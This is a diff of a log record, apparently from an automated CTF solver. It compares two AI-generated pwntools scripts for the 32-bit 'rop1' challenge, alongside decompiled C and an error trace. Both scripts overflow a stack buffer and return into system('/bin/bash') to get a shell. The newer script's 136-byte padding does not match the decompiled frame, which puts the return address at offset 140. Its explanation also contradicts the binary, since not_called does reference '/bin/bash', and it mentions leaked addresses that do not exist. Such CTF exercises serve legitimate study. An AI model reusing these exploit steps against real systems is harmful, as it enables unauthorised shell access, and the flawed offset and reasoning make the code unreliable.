@@ -1,13 +1,10 @@
 {'documents': [],
  'error': 'yes',
- 'generation': code(prefix='To solve this challenge, we need to use Return-Oriented Programming (ROP) to call the `system("/bin/bash")` function and spawn a shell. The binary does not have a stack canary or PIE, but it has NX enabled. We will find the address of the `system` function from the relocation section and construct a ROP chain using gadgets found in the binary. Then we will overflow the buffer in `vulnerable_function` with our payload that includes the ROP chain.\n\nSteps:\n1. Identify the offset to overwrite the return address\n2. Construct ROP chain\n3. Create payload and send it to the vulnerable program', imports='from pwn import *\nimport sys', code='elf = ELF(\'./rop1\')\n\n# Find the offset to overwrite the return address\noffset = cyclic_find(0x6161617f)  # Replace 0x6161617f with the value you get from running the binary and getting an access violation\n\n# Get the address of system and "/bin/bash"\nsystem_addr = elf.plt[\'system\']\nbash_string_addr = next(elf.search(b\'/bin/bash\'))\n\n# Construct the ROP chain\nrop_chain = p32(system_addr)\nrop_chain += p32(0)  # Return address for system (can be junk since system won\'t return)\nrop_chain += p32(bash_string_addr)\n\n# Create the payload\npayload = b\'A\' * offset\npayload += rop_chain\n\n# Start the process and send the payload\np = process(\'./rop1\')\np.sendline(payload)\n\n# Pass interaction back to user\np.interactive()'),
+ 'generation': code(prefix='To solve this challenge, we need to exploit the buffer overflow in `vulnerable_function` and use ROP (Return-Oriented Programming) to call `system("/bin/bash")`. Since ASLR is not enabled but NX is, we can\'t directly inject shellcode. Instead, we will use the gadgets found and leaked addresses to construct a ROP chain that calls system with "/bin/bash" as argument. We also notice that there\'s no direct reference to the string "/bin/bash" in the binary, but it appears in the data section, which means it\'s already mapped into memory. Therefore, our ROP chain will consist of the address of `system` and the address of the string "/bin/bash".', imports='from pwn import *\n', code="elf = ELF('./rop1')\n\n# Start process or remote connection\np = elf.process()\n\n# Get the address of system and /bin/bash from the binary\nsystem_addr = elf.plt['system']\nbash_string_addr = next(elf.search(b'/bin/bash'))\n\n# Build the ROP chain\nrop_chain = b'A' * 136  # Padding to reach return address\nrop_chain += p32(system_addr)  # Overwrite return address with system's address\nrop_chain += p32(0)  # Return address for system (not used)\nrop_chain += p32(bash_string_addr)  # Argument for system\n\n# Send the payload\np.sendline(rop_chain)\n\n# Pass interaction back to user\np.interactive()"),
  'info': 'Challenge is a ELF 32-bit LSB executable file and the file path is '
          '"./pwn/stack/rop-1/rop1".\n'
          '1.Here is the key function for exploit in the C file decompiled from '
          'rop1:\n'
-         '```c\n'
-         '//----- (080484B8) '
-         '--------------------------------------------------------\n'
          'ssize_t vulnerable_function()\n'
          '{\n'
          '  char buf[136]; // [esp+10h] [ebp-88h] BYREF\n'
@@ -15,8 +12,6 @@
          '  return read(0, buf, 0x100u);\n'
          '}\n'
          '\n'
-         '//----- (080484E1) '
-         '--------------------------------------------------------\n'
          'int be_nice_to_people()\n'
          '{\n'
          '  __gid_t v1; // [esp+1Ch] [ebp-Ch]\n'
@@ -25,22 +20,12 @@
          '  return setresgid(v1, v1, v1);\n'
          '}\n'
          '\n'
-         '//----- (0804850A) '
-         '--------------------------------------------------------\n'
          'int __cdecl main(int argc, const char **argv, const char **envp)\n'
          '{\n'
          '  be_nice_to_people();\n'
          '  vulnerable_function();\n'
          '  return write(1, "Hello, World\\n", 0xDu);\n'
          '}\n'
-         '\n'
-         '//----- (080484A4) '
-         '--------------------------------------------------------\n'
-         'int not_called()\n'
-         '{\n'
-         '  return system("/bin/bash");\n'
-         '}\n'
-         '```\n'
          '\n'
          "2.Here is the file security infomation identified by 'checksec' "
          'command:\n'
@@ -79,45 +64,37 @@
  'iterations': 1,
  'messages': [('user', 'How do I use pwntool to solve this challange?'),
               ('assistant',
-               'To solve this challenge, we need to use Return-Oriented '
-               'Programming (ROP) to call the `system("/bin/bash")` function '
-               'and spawn a shell. The binary does not have a stack canary or '
-               'PIE, but it has NX enabled. We will find the address of the '
-               '`system` function from the relocation section and construct a '
-               'ROP chain using gadgets found in the binary. Then we will '
-               'overflow the buffer in `vulnerable_function` with our payload '
-               'that includes the ROP chain.\n'
-               '\n'
-               'Steps:\n'
-               '1. Identify the offset to overwrite the return address\n'
-               '2. Construct ROP chain\n'
-               '3. Create payload and send it to the vulnerable program \n'
+               'To solve this challenge, we need to exploit the buffer '
+               'overflow in `vulnerable_function` and use ROP (Return-Oriented '
+               'Programming) to call `system("/bin/bash")`. Since ASLR is not '
+               "enabled but NX is, we can't directly inject shellcode. "
+               'Instead, we will use the gadgets found and leaked addresses to '
+               'construct a ROP chain that calls system with "/bin/bash" as '
+               "argument. We also notice that there's no direct reference to "
+               'the string "/bin/bash" in the binary, but it appears in the '
+               "data section, which means it's already mapped into memory. "
+               'Therefore, our ROP chain will consist of the address of '
+               '`system` and the address of the string "/bin/bash". \n'
                ' Imports: from pwn import *\n'
-               'import sys \n'
+               ' \n'
                " Code: elf = ELF('./rop1')\n"
                '\n'
-               '# Find the offset to overwrite the return address\n'
-               'offset = cyclic_find(0x6161617f)  # Replace 0x6161617f with '
-               'the value you get from running the binary and getting an '
-               'access violation\n'
+               '# Start process or remote connection\n'
+               'p = elf.process()\n'
                '\n'
-               '# Get the address of system and "/bin/bash"\n'
+               '# Get the address of system and /bin/bash from the binary\n'
                "system_addr = elf.plt['system']\n"
                "bash_string_addr = next(elf.search(b'/bin/bash'))\n"
                '\n'
-               '# Construct the ROP chain\n'
-               'rop_chain = p32(system_addr)\n'
-               'rop_chain += p32(0)  # Return address for system (can be junk '
-               "since system won't return)\n"
-               'rop_chain += p32(bash_string_addr)\n'
+               '# Build the ROP chain\n'
+               "rop_chain = b'A' * 136  # Padding to reach return address\n"
+               'rop_chain += p32(system_addr)  # Overwrite return address with '
+               "system's address\n"
+               'rop_chain += p32(0)  # Return address for system (not used)\n'
+               'rop_chain += p32(bash_string_addr)  # Argument for system\n'
                '\n'
-               '# Create the payload\n'
-               "payload = b'A' * offset\n"
-               'payload += rop_chain\n'
-               '\n'
-               '# Start the process and send the payload\n'
-               "p = process('./rop1')\n"
-               'p.sendline(payload)\n'
+               '# Send the payload\n'
+               'p.sendline(rop_chain)\n'
                '\n'
                '# Pass interaction back to user\n'
                'p.interactive()'),
@@ -135,28 +112,24 @@
                'FileNotFoundError: [Errno 2] No such file or directory: '
                "'./rop1'\n")]}
 from pwn import *
-import sys
+
 elf = ELF('./rop1')
 
-# Find the offset to overwrite the return address
-offset = cyclic_find(0x6161617f)  # Replace 0x6161617f with the value you get from running the binary and getting an access violation
+# Start process or remote connection
+p = elf.process()
 
-# Get the address of system and "/bin/bash"
+# Get the address of system and /bin/bash from the binary
 system_addr = elf.plt['system']
 bash_string_addr = next(elf.search(b'/bin/bash'))
 
-# Construct the ROP chain
-rop_chain = p32(system_addr)
-rop_chain += p32(0)  # Return address for system (can be junk since system won't return)
-rop_chain += p32(bash_string_addr)
+# Build the ROP chain
+rop_chain = b'A' * 136  # Padding to reach return address
+rop_chain += p32(system_addr)  # Overwrite return address with system's address
+rop_chain += p32(0)  # Return address for system (not used)
+rop_chain += p32(bash_string_addr)  # Argument for system
 
-# Create the payload
-payload = b'A' * offset
-payload += rop_chain
-
-# Start the process and send the payload
-p = process('./rop1')
-p.sendline(payload)
+# Send the payload
+p.sendline(rop_chain)
 
 # Pass interaction back to user
 p.interactive()
